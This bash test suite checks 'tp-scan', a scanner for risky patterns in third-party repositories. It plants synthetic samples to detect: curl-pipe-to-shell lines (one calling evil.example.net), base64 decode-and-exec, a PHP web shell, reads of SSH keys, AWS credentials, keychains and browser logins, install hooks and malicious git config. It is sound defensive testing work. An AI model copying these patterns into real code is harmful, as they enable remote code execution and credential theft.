#!/usr/bin/env bash
# Sandbox test for tp-scan: builds one small synthetic repo per pattern in a temp
# dir and checks what tp-scan reports. The "malicious" files write to a canary if
# anything ever runs them, and fake curl, npm, make and friends on PATH do the same,
# so the last checks prove that tp-scan ran nothing. HOME is a temp dir; no network.
#   tests/tp-scan.sh                    test this checkout's script
#   TOOL=/path/to/tp-scan tests/...     test another copy
set -uo pipefail
TOOL=${TOOL:-$(cd "$(dirname "$0")/.." && pwd)/skills/evaluating-third-party-tools/bin/tp-scan}
T=$(mktemp -d /tmp/tp-scan-test.XXXXXX)
export HOME=$T/home GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1 LC_ALL=C
export GIT_AUTHOR_NAME=Alice GIT_AUTHOR_EMAIL=alice@example.com GIT_COMMITTER_NAME=Alice GIT_COMMITTER_EMAIL=alice@example.com
export CANARY=$T/canary
mkdir -p "$HOME/.ssh" "$T/bin" && echo fake-key > "$HOME/.ssh/id_rsa"
for c in curl wget npm npx node yarn pnpm make pre-commit direnv pip pip3 cargo gem; do
  printf '#!/bin/sh\necho "%s $*" >> "$CANARY"\n' "$c" > "$T/bin/$c"; chmod +x "$T/bin/$c"
done
export PATH="$T/bin:$PATH"
pass=0 fail=0 out='' rc=0
check() { if eval "$2"; then pass=$((pass+1)); echo "ok   $1"; else fail=$((fail+1)); echo "FAIL $1"; echo "     exit $rc, output was:"; printf '%s\n' "$out" | head -60 | sed 's/^/     /'; fi; }
scan() { out=$("$TOOL" "$@" 2>&1); rc=$?; }
scanj() { out=$("$TOOL" --json --max 0 "$@" 2>&1); rc=$?; }
has() { printf '%s\n' "$out" | grep -qF -- "$1"; }
# jhas high|medium RULE FILE [LINE]: the JSON output from scanj has that finding
jhas() { printf '%s' "$out" | python3 -I -c '
import json, sys
d = json.load(sys.stdin)
sev, rule, f = sys.argv[1:4]
line = sys.argv[4] if len(sys.argv) > 4 else None
sys.exit(0 if any(x["rule"] == rule and x["file"] == f and (line is None or str(x["line"]) == line) for x in d[sev]) else 1)' "$@"; }
# jnone FILE: no HIGH or MEDIUM finding names FILE
jnone() { printf '%s' "$out" | python3 -I -c '
import json, sys
d = json.load(sys.stdin)
sys.exit(1 if any(x["file"] == sys.argv[1] for s in ("high", "medium") for x in d[s]) else 0)' "$1"; }
# jcount high|medium N: the JSON output has N findings of that severity
jcount() { printf '%s' "$out" | python3 -I -c 'import json, sys; sys.exit(json.load(sys.stdin)["counts"][sys.argv[1]] != int(sys.argv[2]))' "$1" "$2"; }
mk() { mkdir -p "$(dirname "$1")"; cat > "$1"; }
bytes() { python3 -I -c "import sys; open(sys.argv[1], 'wb').write(eval(sys.argv[2]))" "$@"; }
evil() { printf '#!/bin/sh\necho "ran %s" >> "%s"\n' "$1" "$CANARY"; }

# --- a clean repo: no HIGH, no MEDIUM ---------------------------------------
R=$T/clean; mkdir -p "$R"
mk "$R/README.md" <<'EOF'
# Demo

Make sure you have Node 22. Never pipe curl into sh: `curl | sh` hides what runs.

```sh
npm install
npm test
```

The entry point is `src/index.js`. Read `./index.html` for the page.
EOF
printf '{\n  "name": "demo",\n  "version": "1.0.0",\n  "license": "MIT",\n  "scripts": {"test": "node test.js", "build": "tsc"},\n  "repository": "https://github.com/example/demo"\n}\n' > "$R/package.json"
mk "$R/src/index.js" <<'EOF'
// See https://developer.mozilla.org/en-US/docs/Web/API/fetch for the API.
const amplitude = signal.amplitude * 2;   // the audio amplitude of the line segment
export async function load() {
  const res = await fetch('http://localhost:3000/api');
  return res.json();
}
EOF
mk "$R/src/util.py" <<'EOF'
import ast, subprocess
# Users keep their keys in ~/.ssh; this tool never reads them.
def run():
    subprocess.run(["ls"], check=True)
    return ast.literal_eval("[1, 2]")
EOF
printf 'Permission is hereby granted, free of charge, to any person obtaining a copy of this software.\nThe above copyright notice and this permission notice shall be included in all copies.\n' > "$R/LICENSE"
printf '.ssh/\n.env\nnode_modules/\n' > "$R/.gitignore"
mk "$R/.github/workflows/ci.yml" <<'EOF'
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: npm ci && npm test
EOF
bytes "$R/logo.png" "b'\x89PNG\r\n\x1a\n' + bytes(64)"
printf '{"items": [1, 2, 3]}\n' > "$R/fixture.json"
git -C "$R" init -q -b main && git -C "$R" add -A && git -C "$R" commit -qm one
echo "// two" >> "$R/src/index.js"; git -C "$R" add -A
GIT_AUTHOR_NAME=Bob GIT_AUTHOR_EMAIL=bob@example.com git -C "$R" commit -qm two && git -C "$R" tag v1.0
scan "$R"
check "a clean repo exits 0" '[ $rc -eq 0 ]'
check "a clean repo has no HIGH and no MEDIUM findings" 'has "HIGH 0" && has "MEDIUM 0"'
check "the license is MIT" 'has "MIT (LICENSE)" && has "package.json says MIT"'
check "git history: 2 commits by 2 authors, 1 tag" 'has "2 commits since" && has "2 authors" && has "1 tag, "'
check "the language mix is listed" 'has "JavaScript" && has "Python"'

# --- install hooks ------------------------------------------------------------
R=$T/hooks; mkdir -p "$R/scripts" "$R/native" "$R/pkg"
printf '{\n  "name": "x",\n  "scripts": {\n    "postinstall": "node scripts/setup.js",\n    "prepare": "husky"\n  }\n}\n' > "$R/package.json"
evil postinstall > "$R/scripts/setup.js"
mk "$R/setup.py" <<'EOF'
from setuptools import setup
from setuptools.command.install import install
class Evil(install):
    def run(self):
        open('/tmp/x', 'w')
setup(name='x', cmdclass={'install': Evil})
EOF
printf '[build-system]\nrequires = []\nbuild-backend = "backend"\nbackend-path = ["."]\n' > "$R/pyproject.toml"
printf 'import os; os.system("true")\n' > "$R/pkg/evil.pth"
printf '{"targets": [{"target_name": "x", "sources": ["x.cc"]}]}\n' > "$R/native/binding.gyp"
printf 'fn main() {}\n' > "$R/native/build.rs"
printf '[package]\nname = "m"\n[lib]\nproc-macro = true\n' > "$R/native/Cargo.toml"
printf 'require "mkmf"\ncreate_makefile("x")\n' > "$R/native/extconf.rb"
printf '{"scripts": {"post-install-cmd": "php evil.php"}}\n' > "$R/composer.json"
scanj "$R"
check "install hooks exit 1" '[ $rc -eq 1 ]'
check "npm postinstall and prepare are HIGH, each with its line" 'jhas high install-hook package.json 4 && jhas high install-hook package.json 5'
check "setup.py cmdclass is HIGH" 'jhas high install-hook setup.py 6'
check "an in-tree build backend is HIGH" 'jhas high install-hook pyproject.toml 4'
check "a .pth import line is HIGH" 'jhas high install-hook pkg/evil.pth 1'
check "binding.gyp, build.rs, a proc-macro and extconf.rb are HIGH" 'jhas high install-hook native/binding.gyp && jhas high install-hook native/build.rs && jhas high install-hook native/Cargo.toml 4 && jhas high install-hook native/extconf.rb'
check "a Composer install script is HIGH" 'jhas high install-hook composer.json 1'

# --- editor, agent and dev-environment hooks ----------------------------------
R=$T/autorun; mkdir -p "$R"
mk "$R/.vscode/tasks.json" <<'EOF'
{"version": "2.0.0", "tasks": [{"label": "x", "command": "./x.sh",
  "runOptions": {"runOn": "folderOpen"}}]}
EOF
mkdir -p "$R/.claude" && printf '{"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "./x.sh"}]}]}}\n' > "$R/.claude/settings.json"
printf '{"mcpServers": {"x": {"command": "node", "args": ["server.js"]}}}\n' > "$R/.mcp.json"
mkdir -p "$R/.devcontainer" && printf '{\n  "initializeCommand": "./x.sh",\n  "postCreateCommand": "./y.sh"\n}\n' > "$R/.devcontainer/devcontainer.json"
evil envrc > "$R/.envrc"
scanj "$R"
check "a VS Code folderOpen task is HIGH" 'jhas high auto-run .vscode/tasks.json 2'
check "Claude Code project hooks are HIGH" 'jhas high auto-run .claude/settings.json 1'
check "a project MCP server is HIGH" 'jhas high auto-run .mcp.json 1'
check "devcontainer initializeCommand is HIGH, postCreateCommand MEDIUM" 'jhas high auto-run .devcontainer/devcontainer.json 2 && jhas medium dev-env .devcontainer/devcontainer.json 3'
check ".envrc is MEDIUM" 'jhas medium dev-env .envrc'

# --- setup commands the README tells you to run -------------------------------
R=$T/readme; mkdir -p "$R"
mk "$R/README.md" <<'EOF'
# Tool

Make sure you read this first. Then run the setup:

```bash
./install.sh
make setup
npm run bootstrap
pre-commit install
```

Open `./index.html` in a browser.
EOF
evil install.sh > "$R/install.sh"; chmod +x "$R/install.sh"
printf '<html></html>\n' > "$R/index.html"
printf '{"scripts": {"bootstrap": "node scripts/bootstrap.js"}}\n' > "$R/package.json"
printf 'repos: []\n' > "$R/.pre-commit-config.yaml"
scanj "$R"
check "the README's ./install.sh, make target, npm script and pre-commit install are HIGH" 'jhas high readme-run README.md 6 && jhas high readme-run README.md 7 && jhas high readme-run README.md 8 && jhas high readme-run README.md 9'
check "prose and a file name in a code span are not commands" '! jhas high readme-run README.md 3 && ! jhas high readme-run README.md 12'
scan "$R"
check "README notes name what runs" 'has "the README runs ./install.sh" && has "the README runs make setup" && has "node scripts/bootstrap.js" && has "installs the git hooks in .pre-commit-config.yaml"'

# --- pipe-to-shell --------------------------------------------------------------
R=$T/pipe; mkdir -p "$R/scripts" "$R/.github/workflows"
mk "$R/README.md" <<'EOF'
# Install

```sh
curl -fsSL https://get.example.com/install.sh | sh
```
EOF
printf '#!/bin/sh\nwget -qO- https://dl.example.net/i | sudo bash\n' > "$R/scripts/a.sh"
printf '#!/bin/bash\nbash <(curl -s https://dl.example.org/b.sh)\n' > "$R/scripts/b.sh"
printf '#!/bin/sh\ncurl -fsSL https://dl.example.org/c.sh \\\n  | bash\n' > "$R/scripts/c.sh"
python3 -I -c "import sys; open(sys.argv[1], 'w', encoding='utf-16').write('iex (iwr https://dl.example.org/d.ps1)\n')" "$R/scripts/d.ps1"
printf 'on: push\njobs:\n  x:\n    steps:\n      - run: curl -fsSL https://dl.example.org/ci.sh | sh\n' > "$R/.github/workflows/ci.yml"
printf '#!/bin/sh\ncommand -v curl >/dev/null || exit 1\ncurl -fsSL https://dl.example.org/x.sh -o x.sh || exit 1\n' > "$R/scripts/ok.sh"
scanj "$R"
check "curl | sh in a README code block is HIGH" 'jhas high pipe-to-shell README.md 4'
check "wget -qO- | sudo bash is HIGH" 'jhas high pipe-to-shell scripts/a.sh 2'
check "bash <(curl ...) is HIGH" 'jhas high pipe-to-shell scripts/b.sh 2'
check "a pipe after a line continuation is HIGH" 'jhas high pipe-to-shell scripts/c.sh 2'
check "iex (iwr ...) in a UTF-16 PowerShell file is HIGH, and only once" 'jhas high pipe-to-shell scripts/d.ps1 1 && ! jhas high decode-and-run scripts/d.ps1 1'
check "pipe-to-shell in CI is MEDIUM, not HIGH" 'jhas medium pipe-to-shell .github/workflows/ci.yml 5 && ! jhas high pipe-to-shell .github/workflows/ci.yml 5 && jcount high 5'
check "command -v curl is not a download, curl -o is" '! jhas medium download scripts/ok.sh 2 && jhas medium download scripts/ok.sh 3'

# --- decode-and-run ---------------------------------------------------------------
R=$T/decode; mkdir -p "$R"
printf '#!/bin/sh\necho ZWNobyBoaQo= | base64 -d | sh\n' > "$R/a.sh"
printf 'import base64\nexec(base64.b64decode("cHJpbnQoMSk="))\n' > "$R/b.py"
printf 'eval(atob("YWxlcnQoMSk="));\n' > "$R/c.js"
printf '#!/bin/sh\neval "$(curl -fsSL https://env.example.org/e)"\n' > "$R/d.sh"
printf 'powershell -NoProfile -enc SQBFAFgAIAAoAGkAdwByACkA\n' > "$R/e.cmd"
scanj "$R"
check "base64 -d | sh is HIGH" 'jhas high decode-and-run a.sh 2'
check "exec(base64.b64decode(...)) is HIGH" 'jhas high decode-and-run b.py 2'
check "eval(atob(...)) is HIGH" 'jhas high decode-and-run c.js 1'
check "eval \"\$(curl ...)\" is HIGH" 'jhas high decode-and-run d.sh 2'
check "powershell -enc is HIGH" 'jhas high decode-and-run e.cmd 1'

# --- committed binaries, blobs, archives ------------------------------------------
R=$T/bin; mkdir -p "$R"/{elf,pe,macho,so,jar,pyc,disguised,blob,small,arc}
bytes "$R/elf/tool" "b'\x7fELF\x02\x01\x01' + bytes(200)"
bytes "$R/pe/tool.exe" "b'MZ' + bytes(58) + (64).to_bytes(4, 'little') + b'PE\0\0' + bytes(100)"
bytes "$R/macho/tool" "b'\xcf\xfa\xed\xfe' + bytes(200)"
bytes "$R/so/libx.so.1" "bytes(300)"
bytes "$R/jar/app.jar" "b'PK\x03\x04' + bytes(100)"
bytes "$R/pyc/m.pyc" "b'\x6f\x0d\x0d\x0a' + bytes(100)"
bytes "$R/disguised/logo.png" "b'\x7fELF\x02\x01\x01' + bytes(200)"
bytes "$R/blob/payload.dat" "__import__('os').urandom(600 * 1024)"
bytes "$R/small/x.dat" "b'\0' + __import__('os').urandom(2048)"
bytes "$R/arc/fixtures.zip" "b'PK\x03\x04' + bytes(500)"
python3 -I -c "import base64, os, sys; open(sys.argv[1], 'w').write('const p = \"' + base64.b64encode(os.urandom(40000)).decode() + '\";\n')" "$R/payload.js"
python3 -I -c "import base64, sys; open(sys.argv[1], 'w').write('.a { background: url(data:image/png;base64,' + base64.b64encode(b'\x89PNG' + bytes(40000)).decode() + '); }\n')" "$R/style.css"
scanj "$R"
check "ELF, PE, Mach-O, .so, .jar and .pyc binaries are HIGH" 'jhas high binary elf/tool && jhas high binary pe/tool.exe && jhas high binary macho/tool && jhas high binary so/libx.so.1 && jhas high binary jar/app.jar && jhas high binary pyc/m.pyc'
check "an ELF named .png is still a binary" 'jhas high binary disguised/logo.png'
check "a 600 KB unknown binary is a HIGH blob" 'jhas high blob blob/payload.dat'
check "a 2 KB unknown binary is only counted" 'jnone small/x.dat && has "1 small binary file of unknown format"'
check "a 40 KB base64 string in code is a HIGH blob" 'jhas high blob payload.js 1'
check "a data: URI image is not a blob" 'jnone style.css'
check "a small archive is MEDIUM" 'jhas medium archive arc/fixtures.zip'

# --- credential stores --------------------------------------------------------------
R=$T/cred; mkdir -p "$R"
printf "const k = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'));\n" > "$R/a.js"
printf "creds = open(os.path.expanduser('~/.aws/credentials')).read()\n" > "$R/b.py"
printf '#!/bin/sh\nsecurity find-generic-password -s x -w\n' > "$R/c.sh"
printf "db = Path.home() / 'Library/Application Support/Google/Chrome/Default/Login Data'\n" > "$R/d.py"
printf '# this script never reads ~/.ssh/id_rsa\nprint(1)\n' > "$R/e.py"
printf 'Copy your key to `~/.ssh/id_rsa` first.\n' > "$R/NOTES.md"
scanj "$R"
check "reads of ~/.ssh, ~/.aws, the keychain and a browser profile are HIGH" 'jhas high credential-read a.js 1 && jhas high credential-read b.py 1 && jhas high credential-read c.sh 2 && jhas high credential-read d.py 1'
check "a comment or a doc that names ~/.ssh is not a read" 'jnone e.py && jnone NOTES.md'

# --- hidden code ---------------------------------------------------------------------
R=$T/hidden; mkdir -p "$R"
printf 'const isAdmin = false; /* \xe2\x80\xae } if (isAdmin) { \xe2\x81\xa6 */\n' > "$R/a.js"
python3 -I -c "import sys; open(sys.argv[1], 'w').write('x = 1' + ' ' * 200 + 'import os; os.system(\"id\")\n')" "$R/b.py"
scanj "$R"
check "a bidi control character in code is HIGH" 'jhas high hidden-code a.js 1'
check "code pushed off screen by spaces is HIGH" 'jhas high hidden-code b.py 1'
scan "$R"
check "the bidi character is escaped in the output" 'has "\\u202e"'

# --- MEDIUM: telemetry, endpoints, downloads, minified ---------------------------------
R=$T/medium; mkdir -p "$R/src" "$R/dist"
printf "import posthog from 'posthog-js';\n" > "$R/src/a.js"
printf 'import sentry_sdk\nsentry_sdk.init(dsn="x")\n' > "$R/src/b.py"
printf 'const API = "https://api.acme-tracker.io/v1";\nconst HOOK = "https://discord.com/api/webhooks/1/x";\nfetch("http://1.2.3.4/p");\n' > "$R/src/c.js"
printf 'import urllib.request\nurllib.request.urlretrieve(URL, "m.bin")\n' > "$R/src/d.py"
python3 -I -c "import sys; open(sys.argv[1], 'w').write('!function(e,t){e.x=t(e)}(this,function(n){var r=[],o=n.document;return r});' * 40 + '\n')" "$R/src/helper.js"
cp "$R/src/helper.js" "$R/dist/app.js"; printf 'var x=1;\n' > "$R/src/lib.min.js"
scanj "$R"
check "telemetry, a download and minified code outside dist are MEDIUM" 'jhas medium telemetry src/a.js 1 && jhas medium telemetry src/b.py 1 && jhas medium download src/d.py 2 && jhas medium minified src/helper.js 1 && jhas medium minified src/lib.min.js'
check "minified code inside dist is not reported" 'jnone dist/app.js'
check "MEDIUM findings alone exit 0" '[ $rc -eq 0 ]'
scan "$R"
check "telemetry is one finding per vendor" 'has "posthog  src/a.js:1" && has "sentry  src/b.py:1"'
check "a hard-coded host is MEDIUM" 'has "api.acme-tracker.io  src/c.js:1"'
check "a webhook host and a raw IP get their own notes" 'has "discord.com  src/c.js:2  paste, webhook" && has "1.2.3.4  src/c.js:3  raw IP address"'

# --- licenses ---------------------------------------------------------------------------
R=$T/lic; mkdir -p "$R/a" "$R/b"
printf 'Apache License\nVersion 2.0, January 2004\n' > "$R/a/LICENSE"; printf 'x = 1\n' > "$R/b/x.py"
scan "$R/a"; check "an Apache license is named" 'has "Apache-2.0 (LICENSE)"'
scan "$R/b"; check "no license file is reported" 'has "none found"'

# --- symlinks ---------------------------------------------------------------------------
R=$T/links; mkdir -p "$R" "$T/outside"
printf '#!/bin/sh\ncurl -fsSL https://evil.example.net/x | sh\n' > "$T/outside/secret.sh"
bytes "$T/outside/tool" "b'\x7fELF\x02\x01\x01' + bytes(200)"
ln -s "$T/outside/secret.sh" "$R/link.sh"; ln -s "$T/outside" "$R/linkdir"; ln -s "$HOME/.ssh/id_rsa" "$R/key"
ln -s README.md "$R/inside"; printf 'hi\n' > "$R/README.md"
scanj "$R"
check "a symlink out of DIR is not followed" '! has "pipe-to-shell" && ! has "\"binary\""'
check "symlinks out of DIR are MEDIUM" 'jhas medium symlink-out link.sh && jhas medium symlink-out linkdir'
check "a symlink into ~/.ssh is HIGH" 'jhas high credential-read key'
check "a symlink inside DIR is not reported" 'jnone inside'

# --- git: config and hooks never run, history still read ---------------------------------
R=$T/gitrepo; mkdir -p "$R"
evil git > "$T/evil.sh"; chmod +x "$T/evil.sh"
printf 'x\n' > "$R/a.txt"; git -C "$R" init -q -b main && git -C "$R" add -A && git -C "$R" commit -qm one
printf '[core]\n\tfsmonitor = %s\n\tpager = %s\n[log]\n\tshowSignature = true\n[gpg]\n\tprogram = %s\n[alias]\n\tco = !%s\n' \
  "$T/evil.sh" "$T/evil.sh" "$T/evil.sh" "$T/evil.sh" >> "$R/.git/config"
evil post-checkout > "$R/.git/hooks/post-checkout"; chmod +x "$R/.git/hooks/post-checkout"
evil git-in-dir > "$R/git"; chmod +x "$R/git"
out=$(cd "$R" && PATH="$R:.:$PATH" "$TOOL" --json --max 0 . 2>&1); rc=$?
check "git config commands and hooks in .git are HIGH" 'jhas high auto-run .git/config && jhas high auto-run .git/hooks/post-checkout'
check "git history is still read" 'has "1 commit since" && has "1 author"'
check "nothing in .git ran, and a git inside DIR was not used" '[ ! -e "$CANARY" ]'
git -C "$R" status >/dev/null 2>&1
check "(the trap was live: git status in DIR runs its fsmonitor)" '[ -e "$CANARY" ]'
rm -f "$CANARY"
mkdir -p "$T/nogit" && ln -s "$(python3 -I -c 'import sys; print(sys.executable)')" "$T/nogit/python3"
out=$(PATH=$T/nogit "$TOOL" "$R" 2>&1); rc=$?
check "without git on PATH the history is skipped, the scan still runs" 'has "git is not on PATH" && has "result:"'

# --- skipped folders ------------------------------------------------------------------------
R=$T/skip; mkdir -p "$R/node_modules/evil" "$R/vendor/x"
printf '{"scripts": {"postinstall": "node x.js"}}\n' > "$R/node_modules/evil/package.json"
bytes "$R/vendor/x/lib.so" "b'\x7fELF\x02\x01\x01' + bytes(200)"
scan "$R"
check "node_modules and vendor are skipped by default and listed" '[ $rc -eq 0 ] && has "skipped node_modules, vendor"'
scanj --all "$R"
check "--all scans them" '[ $rc -eq 1 ] && jhas high install-hook node_modules/evil/package.json 1 && jhas high binary vendor/x/lib.so'

# --- more ways to run downloaded or decoded code -------------------------------------
R=$T/more; mkdir -p "$R/p" "$R/d" "$R/c"
printf '#!/bin/sh\ncurl -fsSL https://dl.example.org/a.sh | /bin/bash\n' > "$R/p/abs.sh"
printf '#!/bin/sh\nwget -qO- https://dl.example.org/b | /usr/bin/env bash\n' > "$R/p/env.sh"
printf '#!/bin/sh\npython3 -c "$(curl -fsSL https://dl.example.org/c.py)"\n' > "$R/p/py.sh"
printf '#!/bin/sh\ncurl -fsSLo i.sh https://dl.example.org/i.sh && sh i.sh\n' > "$R/p/dl.sh"
printf '#!/bin/sh\nwget https://dl.example.org/tool && chmod +x tool && ./tool\n' > "$R/p/chmod.sh"
printf '& ([scriptblock]::Create((irm https://dl.example.org/s.ps1)))\n' > "$R/p/sb.ps1"
printf '<?php system(base64_decode($_GET["c"])); ?>\n' > "$R/d/a.php"
printf 'import base64, pickle\nobj = pickle.loads(base64.b64decode(BLOB))\n' > "$R/d/b.py"
printf "eval(function(p,a,c,k,e,d){e=String;return p}('0',1,1,'x'.split('|'),0,{}));\n" > "$R/d/c.js"
printf 'eval pack("H*", "414141");\n' > "$R/d/d.pl"
printf '#!/bin/sh\nprintf %s | sh\n' "'\\x65\\x63\\x68\\x6f\\x20\\x68\\x69'" > "$R/d/e.sh"
printf '#!/bin/bash\nbash <<< "$(echo ZWNobyBoaQo= | base64 -d)"\n' > "$R/d/f.sh"
printf 'exec("".join(map(chr, [112, 114, 105, 110, 116])))\n' > "$R/d/g.py"
printf "const t = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');\n" > "$R/c/a.js"
printf 'h = open(os.path.expanduser("~/.bash_history")).read()\n' > "$R/c/b.py"
printf "const db = process.env.APPDATA + '\\\\discord\\\\Local Storage\\\\leveldb';\n" > "$R/c/c.js"
printf "k = os.path.expanduser('~/.local/share/keyrings/login.keyring')\n" > "$R/c/d.py"
scanj "$R"
check "a pipe into /bin/bash or /usr/bin/env bash is HIGH" 'jhas high pipe-to-shell p/abs.sh 2 && jhas high pipe-to-shell p/env.sh 2'
check "python3 -c \"\$(curl ...)\" is HIGH" 'jhas high pipe-to-shell p/py.sh 2'
check "download, then run on the same line, is HIGH" 'jhas high pipe-to-shell p/dl.sh 2 && jhas high pipe-to-shell p/chmod.sh 2'
check "a PowerShell scriptblock from irm is HIGH" 'jhas high pipe-to-shell p/sb.ps1 1'
check "system(base64_decode(...)) and pickle.loads(b64decode(...)) are HIGH" 'jhas high decode-and-run d/a.php 1 && jhas high decode-and-run d/b.py 2'
check "packed JavaScript and Perl eval pack are HIGH" 'jhas high decode-and-run d/c.js 1 && jhas high decode-and-run d/d.pl 1'
check "escaped bytes piped to sh and a base64 here-string are HIGH" 'jhas high decode-and-run d/e.sh 2 && jhas high decode-and-run d/f.sh 2'
check "exec of a chr() string is HIGH" 'jhas high decode-and-run d/g.py 1'
check "reads of ~/.npmrc, shell history, Discord storage and keyrings are HIGH" 'jhas high credential-read c/a.js 1 && jhas high credential-read c/b.py 1 && jhas high credential-read c/c.js 1 && jhas high credential-read c/d.py 1'

R=$T/morehooks; mkdir -p "$R/plugin/hooks" "$R/plugin/.claude-plugin" "$R/sx"
printf 'import os\n' > "$R/sitecustomize.py"
printf 'source "https://rubygems.org"\nsystem("curl -s https://x.example.com | sh")\ngem "rake"\n' > "$R/Gemfile"
printf 'Gem::Specification.new do |s|\n  s.files = `git ls-files -z`.split("\\x0")\nend\n' > "$R/ok.gemspec"
printf '<project><build><plugins><plugin>\n<artifactId>exec-maven-plugin</artifactId>\n</plugin></plugins></build></project>\n' > "$R/pom.xml"
printf '{ pkgs }: pkgs.mkShell {\n  shellHook = "./setup.sh";\n}\n' > "$R/shell.nix"
printf '{"hooks": {"PreToolUse": [{"hooks": [{"type": "command", "command": "./h.sh"}]}]}}\n' > "$R/plugin/hooks/hooks.json"
printf '{"name": "p", "mcpServers": {"x": {"command": "node"}}}\n' > "$R/plugin/.claude-plugin/plugin.json"
bytes "$R/sx/install.run" "b'#!/bin/sh\ntail -n +3 \"\$0\" | tar xz; ./payload\n' + bytes(64) + __import__('os').urandom(256)"
scanj "$R"
check "sitecustomize.py is HIGH" 'jhas high install-hook sitecustomize.py'
check "a Gemfile that shells out is HIGH; a gemspec that runs git ls-files is not" 'jhas high install-hook Gemfile 2 && jnone ok.gemspec'
check "a Maven exec plugin is HIGH" 'jhas high install-hook pom.xml 2'
check "a Nix shellHook is MEDIUM" 'jhas medium dev-env shell.nix 2'
check "Claude Code plugin hooks and MCP servers are HIGH" 'jhas high auto-run plugin/hooks/hooks.json 1 && jhas high auto-run plugin/.claude-plugin/plugin.json 1'
check "a script with binary data after it is HIGH" 'jhas high binary sx/install.run'

R=$T/robust; mkdir -p "$R"
printf '#!/bin/sh\ncurl -fsSL https://dl.example.org/x | sh\n' > "$R/$(printf 'bad\377.sh')"
python3 -I -c "import sys; open(sys.argv[1], 'w').write('[' * 100000 + ']' * 100000)" "$R/package.json"
scanj "$R"
check "an undecodable file name and deeply nested JSON do not crash the scan" '[ $rc -eq 1 ] && jhas high pipe-to-shell "bad\\udcff.sh" 2'

# --- review round 3: calls across lines, callbacks, Ruby backticks, late payloads --------------
R=$T/round3; mkdir -p "$R"
printf 'import base64\nexec(\n    base64.b64decode(payload)\n)\n' > "$R/multi.py"
printf 'setInterval(() => fetch("/status"), 1000)\nchild_process.exec("date"), atob(value);\n' > "$R/poll.js"
printf 'Gem::Specification.new do |s|\n  s.files = `touch /tmp/canary; git ls-files`.split\nend\n' > "$R/bad.gemspec"
printf 'Gem::Specification.new do |s|\n  s.name = %%x(id)\nend\n' > "$R/x.gemspec"
bytes "$R/late.run" "b'#!/bin/sh\n' + b'# ' + b'x' * 10000 + b'\ntail -n +4 \"\$0\" | tar xz\n' + bytes(64) + __import__('os').urandom(256)"
scanj "$R"
check "exec( with the decoder on the next line is HIGH" 'jhas high decode-and-run multi.py 2'
check "a polling callback and an unrelated later call are not decode-and-run" '! jhas high decode-and-run poll.js'
check "backticks and %x in a gemspec are HIGH, a plain git ls-files is not" 'jhas high install-hook bad.gemspec 2 && jhas high install-hook x.gemspec 2'
check "a script whose binary payload starts after 8 KB is HIGH" 'jhas high binary late.run'

R=$T/round4; mkdir -p "$R/.cargo" "$R/y"
printf 'module.exports = { hooks: { readPackage(p) { require("child_process").execSync("./prepare.sh"); return p } } }\n' > "$R/.pnpmfile.cjs"
printf 'plugins:\n  - path: ./plugin.js\n' > "$R/y/.yarnrc.yml"
printf '[build]\nrustc-wrapper = "./wrapper.sh"\n' > "$R/.cargo/config.toml"
printf 'curl -fsSLo i.py https://example.org/i.py && python3 i.py\ncurl -fsSLo i.sh https://example.org/i.sh && /bin/sh i.sh\n' > "$R/get.sh"
printf 'curl -fsSLo data.json https://example.org/data.json\n' > "$R/fetch-only.sh"
scanj "$R"
check "a pnpmfile is HIGH" 'jhas high install-hook .pnpmfile.cjs'
check "Yarn plugins are HIGH" 'jhas high install-hook y/.yarnrc.yml 1'
check "a Cargo rustc-wrapper is HIGH" 'jhas high install-hook .cargo/config.toml 2'
check "a download run by python3 or /bin/sh is HIGH; a download alone is not" 'jhas high pipe-to-shell get.sh 1 && ! jhas high pipe-to-shell fetch-only.sh'

R=$T/round5; mkdir -p "$R/p" "$R/w" "$R/m"
printf 'pnpmfile=./scripts/pnpm-hooks.cjs\n' > "$R/p/.npmrc"
printf 'packages:\n  - "pkgs/*"\npnpmfile: ./hooks.cjs\n' > "$R/w/pnpm-workspace.yaml"
printf '{"name": "x", "scripts": {"pnpm:devPreinstall": "node prepare.js"}}\n' > "$R/package.json"
printf '<Project>\n  <UsingTask TaskName="T" TaskFactory="RoslynCodeTaskFactory" AssemblyFile="x.dll">\n  </UsingTask>\n</Project>\n' > "$R/m/Directory.Build.targets"
scanj "$R"
check "a configured pnpmfile path is HIGH, in .npmrc and in pnpm-workspace.yaml" 'jhas high install-hook p/.npmrc 1 && jhas high install-hook w/pnpm-workspace.yaml 3'
check "pnpm:devPreinstall is HIGH" 'jhas high install-hook package.json 1'
check "an MSBuild inline task factory is HIGH" 'jhas high install-hook m/Directory.Build.targets 2'

# --- output safety, special files, flags, exit codes ----------------------------------------
R=$T/out; mkdir -p "$R"
printf '#!/bin/sh\ncurl -fsSL https://dl.example.org/x | sh  # \x1b[2J\x1b]0;pwned\x07\n' > "$R/$(printf 'a\033[31mb.sh')"
mkfifo "$R/pipe" 2>/dev/null
printf 'x\n' > "$R/locked.txt"; chmod 000 "$R/locked.txt"
( "$TOOL" "$R" > "$T/fifo.out" 2>&1 ) & spid=$!
for i in $(seq 1 100); do kill -0 "$spid" 2>/dev/null || break; sleep 0.1; done
if kill -0 "$spid" 2>/dev/null; then kill "$spid"; hung=1; else hung=0; fi; wait "$spid" 2>/dev/null
out=$(cat "$T/fifo.out"); rc=0
check "a FIFO in DIR does not block the scan" '[ $hung -eq 0 ] && has "result:"'
check "no escape or bell bytes reach the terminal" '! printf "%s" "$out" | grep -q "$(printf "\033")" && ! printf "%s" "$out" | grep -q "$(printf "\007")"'
if [ "$(id -u)" -ne 0 ]; then check "an unreadable file is counted, not fatal" 'has "1 unreadable"'; fi
chmod 600 "$R/locked.txt"
scan --json --max 1 "$T/pipe"
check "--json is valid JSON with the counts" 'printf "%s" "$out" | python3 -I -c "import json,sys; d=json.load(sys.stdin); assert d[\"counts\"][\"high\"] == 5 and len(d[\"high\"]) == 1 and d[\"omitted\"][\"high\"] == 4 and d[\"exit\"] == 1"'
scan --max 2 "$T/pipe"
check "--max caps each group and says how many it left out" 'has "... 3 more HIGH findings"'
scan --help; check "--help exits 0 and documents the exit codes" '[ $rc -eq 0 ] && has "exit  0" && has "3  usage error"'
scan; check "no DIR is a usage error (3)" '[ $rc -eq 3 ]'
scan "$T/a" "$T/b"; check "two DIRs is a usage error (3)" '[ $rc -eq 3 ]'
